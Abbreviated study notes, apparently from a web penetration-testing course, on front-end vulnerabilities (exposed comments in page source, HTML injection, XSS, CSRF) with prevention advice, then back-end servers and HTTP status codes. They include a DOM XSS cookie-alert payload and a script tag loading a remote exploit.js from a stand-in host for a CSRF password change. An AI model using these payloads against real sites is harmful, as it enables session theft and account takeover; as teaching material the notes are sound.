All of the `front end` components that have be covered are interacted w on the client-side. Therefore, if they are atk'd, they do not pose a direct threat to the core `back end` of the web app and usually will not lead to perm dmg. However, as these components are exec'd on the `client-side`, they put the end-user in danger of being atk'd and exploited if they do have any vulns. If a front end vuln is leveraged to atk admin users, it could result in unauth access, access to sensitive data, service disruption, and more.

Although the majority of web app pentesting is focused on back end components and their fn, it is important also to test front end components for potential vulns, as these types of vulns can sometimes be util'd to gain access to sensitive fn'ality (e.g. an admin panel), which may lead to compromising the entire server.

[Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) refers to the avail of sensitive data in clear-text to the end-user. This is usually found in the `source code` of the web pg or pg source on the front end of web apps. This is the HTML source code of the app, not to be confused w the back end code that is typically only accessible on the server itself. Any website's pg source can be viewed in a web browser by right-clicking anywhere on the pg and selecting `View Page Source` from the pop-up menu. Sometimes a dev may disable right-clicking on a web app, but this does not prevent being able to view the pg source as a keyboard shortcut can be set to do so or the pg source can be viewed through a web proxy such as `Burp Suite`. Taking a look at the google.com pg source will open a new tab in the browser w the URL `view-source:https://www.google.com/`. Here can be seen the `HTML`, `JS`, and external links.

Browsing through the pg source may reveal `login credentials`, `hashes`, or other sensitive data hidden in the comments of the source code or w/i external `JS` code being imported. Other sensitive info may include exposed links, dirs, or even exposed user info, all of which can potentially be leveraged to further access w/i the web app or even the web app's supporting infra (webserver, db server, etc.).
#### Example
At first glance, this login form does not look like anything out of the ordinary:![[Pasted image 20240617181503.png]]But, looking at the source code reveals that the devs added come comments that they forgot to rm:
```html
<form action="action_page.php" method="post">

    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <!-- TODO: remove test credentials test:test -->

        <button type="submit">Login</button>
    </div>
</form>

</html>
```
`<!-- TODO: remove test credentials test:test -->` is the comment to notice, which seems to be a reminder for the devs to rm the test creds. Given that the comment has not been rm'd yet, these creds may still be valid.

Although it is not v common to find login creds in the dev comments, various bits of sensitive and valuable info can still be found, such as test pg's or dirs, debugging params, or hidden fn'ality. There are various automated tools that can be used to scan and analyze avail pg source code to id potential paths or dirs and other sensitive info.

Leveraging these types of info can give further access to the web app, which may help atking the back end components to gain ctrl o/ the server.
### Prevention
Ideally, the front end source code should only contain the code necessary to run all of the web app fn's, w/o any extra code or comments that are not necessary for the web app to fn properly. It is always important to review code that will be visible to end-users through the pg source or run it through tools to check for exposed info.

It is also important to classify data types w/i the source code and apply ctrls on what can or cannot be exposed on the client-side. Devs should also review client-side code to ensure that no unnecessary comments or hidden links are left behind. Furthermore, front end devs may want to use `JS` code packing or obfuscation to reduce the chances of exposing sensitive data through `JS code`. These techniques may prevent automated tools from locating these types of data.
## HTML Injection
Another major aspect of front end sec is validating and sanitizing accepted user input. In many cases, user input validation and sanitization is carried out on the back end. However, some user input would never make it to the back end in some cases and is completely proc'd and rendered on the front end. Therefore, it is critical to validate and sanitize user input on both the front and back end.

[HTML injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection) occurs when unfiltered user input is displayed on the pg. This can either be through retrieving previously submitted code ,like retrieving a user comment from the back end db, or by directly displaying unfiltered user input through `JS` on the front end.

When a user has complete ctrl of how their input will be displayed, they can submit `HTML` code, and the browser may display it as part of the pg. This may include a malicious `HTML` code, like an external login form, which can be used to trick users into logging in while actually sending their login creds to a malicious server to be collected for other atks.

Another example of `HTML Injection` is web pg defacing. This consists of inj new `HTML` code to change the web pg's appearance, inserting malicious ads, or even completely changing the pg. This type of atk can result in severe reputational dmg to the co hosting the web app.
#### Example
The following example is a v basic web pg w a single button "`Click to enter your name`." When that button is clicked, it prompts the user to input their name and then displays, "`Your name is <name>`":![[Pasted image 20240618112451.png]]If no input sanitization is in place, this is potentially an easy target for `HTML Injection` and `XSS` atks. Taking a look at the pg source code reveals no input sanitization in place whatsoever, as the pg takes user input and directly displays it:
```html
<!DOCTYPE html>
<html>

<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");

            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>

</html>
```
To test for `HTML inj`, simply input a small snippet of `HTML` code as the name and see if it is displayed as part of the pg. This example will test the following code, which changes the bg img of the web pg:
```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```
Once inputed, the bg img instantly changes to:![[Pasted image 20240618112741.png]]In this example, as everything is being carried out on the front end, refreshing the web pg would reset everything back to normal.
## Cross-Site Scripting (XSS)
`HTML Injection` vulns can often be util'd to also perform [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) atks by inj `JS` code to be exec'd on the client-side. Once code can be exec'd on the victim's machine, access can potentially gained to the victim's acct or even their machine. `XSS` is v similar to `HTML inj` in practice. However, `XSS` involves the inj of `JS` code to perform more advanced atks on the client-side, instead of merely inj HTML code. There are three main types of `XSS`:

| **Type**        | **Description**                                                                                                              |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `Reflected XSS` | Occurs when user input is displayed on the pg after proc'ing (e.g. search result or err msg)                                 |
| `Stored XSS`    | Occurs when user input is stored in the back end db and then displayed upon retrieval (e.g. posts or cmts)                   |
| `DOM XSS`       | Occurs when user input is directly shown in the browser and is written to an `HTML DOM` obj (e.g. vuln username or pg title) |
In the `HTML Inj` example in the previous section, there was no input sanitization whatsoever. Therefore, it may be possible for the same pg to be vuln to `XSS` atks, which can be attempted using the following `DOM XSS JS` code as a payload, showing the cookie val for the current user:
```javascript
#"><img src=/ onerror=alert(document.cookie)>
```
Once the payload is inputted, hit `ok`, and, if successful, an alert window should pop up w the cookie val in it:![[Pasted image 20240618113836.png]]This payload is accessing the `HTML` doc tree and retrieving the `cookie` obj's val. When the browser proc's the input, it will be considered a new `DOM`, and the `JS` will be exec'd, displaying the cookie val in the popup.

An atkr can leverage this to steal cookie sesshions and send them to themselves and attempt to use the cookie val to auth to the victim's acct. The same atk can be used to perform various types of other atks against a web app's users. `XSS` is a vast topic that will be covered in-depth in later modules.
## Cross-Site Request Forgery (CSRF)
The third type of front end vuln that is caused by unfiltered user input is [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf). `CSRF` atks may util `XSS` vulns to perform certain queries, and `API` calls on a web app that the victim is currently auth'd to. This would allow the atkr to perform actions as the auth'd user. It may also util other vulns to perform the same fns, like util HTTP params for atks.

A common `CSRF` atk to gain higher priv access to a web app is to craft a `JS` payload that auto-changes the victim's passwd to the val set by the atkr. Once the victim views the payload on the vuln pg (e.g. a malicious cmt containing the `JS CSRF` payload), the `JS` code would auto-exec. It would use the vic's logged-in session to change their passwd. Once that is done, the atkr can log in to the vic's acct and ctrl it.

`CSRF` can also be leveraged to atk admins and gain access to their accts. Admins usually have access to sensitive fns, which can sometimes be used to atk and gain ctrl o/ the back-end server (depending on the fn'ality provided to admins w/i a given web app). Following the examples used so far, instead of using `JS` code that would return the session cookie, load a remote `.js` file as follows:
```html
"><script src=//www.example.com/exploit.js></script>
```
The `exploit.js` file would contain the malicious `JS` code that changes the user's passwd. Dev;ing the `exploit.js` in the cs req's knowledge of this web app's passwd changing procedure and `APIs`. The atkr would need to create `JS` code that would replicate the desired fnality and auto-carry it out (i.e. `JS` code that changes the passwd for this specific web app).
### Prevention
Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end b4 it reaches the back end, and esp if this code may be displayed directly on the client-side w/o comms w the back end. Two main ctrls must be applied when accepting user input:

| **Type**       | **Description**                                                                                             |
| -------------- | ----------------------------------------------------------------------------------------------------------- |
| `Sanitization` | Removing special chars and non-std chars from user input b4 displaying it or storing it.                    |
| `Validation`   | Ensuring that submitted user input matches the expected format (i.e. submitted email matched email format). |
Furthermore, it is also important to sanitize displayed output and clear any special/nonstd chars. In cs an atkr mngs to bypass front and back end sanitization and validation filters, it will still not cause any harm on the front end.

Once user input and displayed output is sanitized and/or validated, atks like `HTML inj`, `XSS`, and `CSRF` should be easy to prevent. Another solution would be to implement a [web app fw (WAF)](https://en.wikipedia.org/wiki/Web_application_firewall), which should help to prevent inj attempt automatically. However, it should be noted the `WAF` sol's can potentially be bypassed, so devs should following coding best practices and not merely rely on an appliance to detect/block atks.

As for `CSRF`, many modern browsers have built-in anti-CSRF measures, which auto-prevents exec'ing `JS` code. Furthermore, many modern web apps have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e. `anti-CSRF` token, or `http-only`/`X-XSS-Protection`). Certain other measures can be taken from a fnal level, like req the user to input their passwd b4 changing it. Many of these sec measures can be bypassed, and therefore these types of vulns can still pose a major threat to the users of a web app. This is why these precautions should only be relied upon as a secondary measure, and devs should always ensure that their code is not vuln to any of these atks.

This [Cross Site Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) from OWASP discusses the atk and prevention measures in greater detail.
# Back End Components
## Back End Servers
A back-end server is the hardware and OS on the back end that hosts all of the apps necessary to run the web app. It is the realy sys running all the proc's and carrying out all of the tasks that make up the entire web app. The back end server would fit in the [data access layer](https://en.wikipedia.org/wiki/Data_access_layer) of the OSI model.
### Software
The back end server contains the other 3 back end components:
- `Web Server`
- `Database`
- `Development Framework` 
![[Pasted image 20240618120728.png]]Other software components on the back end server may include [hypervisors](https://en.wikipedia.org/wiki/Hypervisor), containers, and WAFs.

There are many popular combos of "stacks" for back end servers, which contain a specific set of back end components. Some common examples include:

| **Combinations**                                                  | **Components**                                     |
| ----------------------------------------------------------------- | -------------------------------------------------- |
| [LAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle))      | `Linux`, `Apache`, `MySQL`, and `PHP`.             |
| [WAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)#WAMP) | `Windows`, `Apache`, `MySQL`, and `PHP`.           |
| [WINS](https://en.wikipedia.org/wiki/Solution_stack)              | `Windows`, `IIS`, `.NET`, and `SQL Server`         |
| [MAMP](https://en.wikipedia.org/wiki/MAMP)                        | `macOS`, `Apache`, `MySQL`, and `PHP`.             |
| [XAMPP](https://en.wikipedia.org/wiki/XAMPP)                      | Cross-Platform, `Apache`, `MySQL`, and `PHP/PERL`. |
We can find a comprehensive list of Web Solution Stacks in this [article](https://en.wikipedia.org/wiki/Solution_stack).
### Hardware
The back end server contains all of the necessary hardware. The power and performance capabilities of this hardware determine how stable and responsive the web app will be. As previously discussed in the `Architecture` section, many archt's, esp for huge web apps, are designed to distribute their load o/ many back end servers that collectively work together to perform the same tasks and deliver the web app to the end user. Web apps do not have to run directly on a single back end server but may util data centers and cloud hosting servers that provide virtual hosts for the web app.
## Web Servers
A [web server](https://en.wikipedia.org/wiki/Web_server) is an app that runs on the back end server, which handles all of the HTTP traf from the client-side browser, routes it to the requested pgs, and finally responds to the client-side browser. Web servers usually run on TCP [ports](https://en.wikipedia.org/wiki/Port_(computer_networking)) `80` or `443`, and are responsible for connecting end-users to various parts of the web app, in addition to handling their various responses.
### Workflow
At typical web server accepts HTTP requests from the client-side, and responds w diff HTTP responses and codes, like a code `200 OK` response for a successful request, a code `404 NOT FOUND` when requesting pg's that do not exist, code `403 FORBIDDEN` for requesting access to a restricted pgs, and so on.![[Pasted image 20240618184432.png]]The following are some of the most common [HTTP response codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status):

| **Code**                    | **Description**                                                                                          |
| --------------------------- | -------------------------------------------------------------------------------------------------------- |
| `200 OK`                    | The request has succeeded                                                                                |
| `301 Moved Permanently`     | The URL of the requested resource has been changed permanently                                           |
| `302 Found`                 | The URL of the requested resource has been changed temporarily                                           |
| `400 Bad Request`           | The server could not understand the request due to invalid syntax                                        |
| `401 Unauthorized`          | Unauthenticated attempt to access pg                                                                     |
| `403 Forbidden`             | The client does not have access rights to the content                                                    |
| `404 Not Found`             | The server can not find the requested resource                                                           |
| `405 Method Not Allowed`    | The request method is known by the server but has been disabled and cannot be used                       |
| `408 Request Timeout`       | This response is sent on an idle connection by some servers, even w/o any previous request by the client |
| `500 Internal Server Error` |                                                                                                          |